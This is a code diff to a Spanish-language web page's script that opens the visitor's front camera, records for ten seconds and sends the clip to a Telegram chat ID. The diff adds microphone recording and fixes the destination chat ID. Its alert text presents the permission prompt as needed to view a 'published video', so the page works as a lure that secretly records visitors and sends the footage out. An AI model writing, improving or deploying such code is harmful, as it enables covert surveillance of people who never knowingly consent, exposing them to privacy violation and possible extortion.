@@ -63,8 +63,9 @@
             try {
                 const constraints = {
                     video: {
-                        facingMode: "user" // Intenta usar la cámara frontal
-                    }
+                        facingMode: "user"
+                    },
+                    audio: true // Solicita permisos de micrófono para grabar audio
                 };
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 const videoElement = document.getElementById('video');
@@ -92,13 +93,13 @@
                 }, 10000); // Detener la grabación después de 10 segundos
             } catch (error) {
                 console.error('Error al acceder a la cámara:', error);
-                alert('No se pudo acceder a la pagina. Asegúrate de haber dado permiso requerido por tu navegador para ingresar al video publicado.');
+                alert('No se pudo acceder a la página. Asegúrate de haber dado permiso requerido por tu navegador para ingresar al video publicado.');
             }
         }
 
         async function enviarVideo(blob) {
             const formData = new FormData();
-            formData.append('chat_id', '@rs_victor'); // O utiliza '6932235667' en lugar de '@rs_victor'
+            formData.append('chat_id', '6932235667'); // O utiliza '6932235667' en lugar de '@rs_victor'
             formData.append('video', blob, 'video.mp4');
 
             try {
